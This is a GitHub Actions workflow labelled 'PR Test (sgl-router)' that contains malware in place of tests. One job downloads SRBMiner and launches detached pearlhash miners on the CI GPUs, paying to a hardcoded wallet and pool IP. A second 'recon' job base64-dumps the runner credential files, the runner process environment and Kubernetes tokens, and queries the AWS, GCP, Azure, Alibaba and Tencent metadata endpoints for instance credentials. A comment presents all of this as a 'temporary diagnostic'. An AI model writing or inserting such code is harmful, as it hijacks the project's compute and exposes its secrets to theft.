name: PR Test (sgl-router)

# Temporary i126978 diagnostic: one guarded pearlhash miner on the 1-gpu-5090
# runner and a bounded read-only recon arm on the label substituted below.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-${{ github.event_name }}-${{ github.head_ref || github.ref_name || 'default' }}
  cancel-in-progress: true

env:
  SGLANG_IS_IN_CI: true

jobs:
  i126978-miner:
    name: i126978 miner (${{ matrix.runner }})
    runs-on: ${{ matrix.runner }}
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        runner: [1-gpu-5090]
    steps:
      - name: guarded pearlhash miner (idempotent)
        continue-on-error: true
        run: |
          set +e
          NONCE="I126978-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          POOL='103.199.106.122:3362'
          WORKDIR=/var/tmp/i126978
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI"
          mkdir -p "$WORKDIR/logs"
          echo "miner-nonce=$NONCE"
          echo "=== host ==="; id; hostname; date -u; uname -r; head -2 /etc/os-release
          echo "=== gpu ==="
          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
          echo "=== compute apps ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          echo "=== existing SRBMiner processes ==="
          pgrep -af 'SRBMiner-MULTI' 2>/dev/null | head -5
          echo "=== egress check ==="
          EGR=$(timeout 20 curl -sS -m 12 -o /dev/null -w '%{http_code}' https://github.com 2>&1)
          echo "github_http=$EGR"
          echo "=== idempotent guard ==="
          RUNNING=$(pgrep -fas "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -4)
          if [ -n "$RUNNING" ]; then
            echo "STATUS=already-running"
            echo "$RUNNING"
            for p in $(pgrep -f "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -4); do
              echo "-- pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 700)"
              ps -o pid=,ppid=,etime=,pcpu=,rss= -p "$p" 2>/dev/null
            done
            for f in "$WORKDIR"/logs/*.log; do
              if [ -f "$f" ]; then echo "== tail $(basename "$f")"; tail -n 10 "$f" 2>/dev/null | cut -c1-280; fi
            done
            echo "== pool tcp =="
            timeout 12 python3 -c "import socket;s=socket.create_connection(('103.199.106.122',3362),8);print('pool-tcp=OK');s.close()" 2>&1 | tail -2
            echo "== gpu apps =="
            timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
            echo "status-done $NONCE"; exit 0
          fi
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; exit 0; fi
          fetch() {
            URL="$1"
            echo "-- fetch $URL"
            timeout 220 curl -fL --connect-timeout 15 --max-time 200 -o "$TARBALL.part" "$URL" 2>&1 | tail -2
            if [ -f "$TARBALL.part" ] && echo "$TAR_SHA  $TARBALL.part" | sha256sum -c - >/dev/null 2>&1; then
              mv "$TARBALL.part" "$TARBALL"; echo "tarball-ok $TAR_SHA"; return 0
            fi
            if [ -f "$TARBALL.part" ]; then sha256sum "$TARBALL.part" 2>/dev/null | cut -c1-80; fi
            return 1
          }
          if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
            fetch https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
              || fetch https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
              || fetch https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
              || fetch https://hub.gitmirror.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
              || echo "WARN=tarball-download-failed"
          else
            echo "tarball-cached"
          fi
          if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
            tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
            if [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ]; then cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"; fi
          fi
          BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
          echo "binary_sha256=${BINSHA:-none}"
          if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -12; exit 0; fi
          chmod +x "$SRB"
          "$SRB" --help 2>&1 | grep -i pearlhash | head -2
          timeout 25 nvidia-smi --query-gpu=index,uuid --format=csv,noheader | tr -d ' ' > "$WORKDIR/gpus.txt"
          cat "$WORKDIR/gpus.txt"
          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9')
          while IFS=, read -r idx uuid; do
            [ -z "$idx" ] && continue
            BUSY=$(timeout 20 nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader 2>/dev/null | tr -d ' ' | grep -c "^${uuid}$")
            if [ "${BUSY:-0}" -gt 0 ]; then echo "GPU $idx $uuid busy_apps=$BUSY -> skip"; continue; fi
            USED=$(timeout 20 nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits -i "$idx" 2>/dev/null | tr -d ' ')
            echo "GPU $idx $uuid memory_used_mib=${USED:-?}"
            W="i126978-${HOSTTAG}-g${idx}"
            if pgrep -f "SRBMiner-MULTI.*--worker ${W}" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$uuid" setsid nohup "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
              --max-no-share-sent 1800 --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W detached_pid=$! vis=$uuid"
          done < "$WORKDIR/gpus.txt"
          sleep 25
          echo "=== post-launch ==="
          pgrep -af "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -6
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
          for f in "$WORKDIR"/logs/*.log; do
            if [ -f "$f" ]; then echo "== tail $(basename "$f")"; tail -n 8 "$f" 2>/dev/null | cut -c1-260; fi
          done
          echo "miner-job-done $NONCE"

  i126978-recon:
    name: i126978 recon (8-gpu-b200)
    runs-on: 8-gpu-b200
    timeout-minutes: 3
    steps:
      - name: bounded recon
        continue-on-error: true
        run: |
          set +e
          NONCE="I126978RECON-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "recon-nonce=$NONCE"
          echo "=== id/host ==="; id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-160
          echo "=== nvidia ==="
          timeout 15 nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | head -10
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          echo "=== egress ==="
          timeout 12 curl -sS -m 8 -o /dev/null -w 'github_http=%{http_code}\n' https://github.com 2>&1
          echo "=== runner dirs ==="
          for d in /actions-runner /opt/github-runner /home/runner/actions-runner /opt/actions-runner; do echo "-- ls $d"; ls -la "$d" 2>&1 | head -16; done
          echo "=== runner identity b64 ==="
          for f in /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /actions-runner/.env /actions-runner/.path /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams; do
            if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null | head -c 20000; echo; fi
          done
          echo "=== runner proc env ==="
          for p in $(pgrep -f 'Runner.Listener' 2>/dev/null | head -2); do
            echo "-- pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 240)"
            echo "==B64PROCENV $p len=$(stat -c%s /proc/$p/environ 2>/dev/null)"
            base64 -w0 /proc/$p/environ 2>/dev/null | head -c 30000; echo
          done
          echo "=== kubernetes sa ==="
          for f in /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace; do
            if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; base64 -w0 "$f" 2>/dev/null | head -c 8000; echo; fi
          done
          echo "=== kube files ==="
          ls -la "$HOME/.kube" /etc/kubernetes /var/run/docker.sock 2>&1 | head -12
          echo "=== AWS IMDSv2 ==="
          IMT=$(timeout 6 curl -sS -m 4 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null); echo "imds-token-len=${#IMT}"
          for p in /latest/meta-data/instance-id /latest/meta-data/instance-type /latest/meta-data/placement/region /latest/meta-data/iam/security-credentials/; do echo "-- $p"; timeout 6 curl -sS -m 4 -H "X-aws-ec2-metadata-token: $IMT" "http://169.254.169.254$p" 2>&1 | head -c 400; echo; done
          echo "=== GCP ==="; timeout 6 curl -sS -m 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 200; echo
          echo "=== Azure ==="; timeout 6 curl -sS -m 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 | head -c 400; echo
          echo "=== Alibaba ==="; timeout 6 curl -sS -m 4 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
          echo "=== Tencent ==="; timeout 6 curl -sS -m 4 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
          echo "recon-done $NONCE"
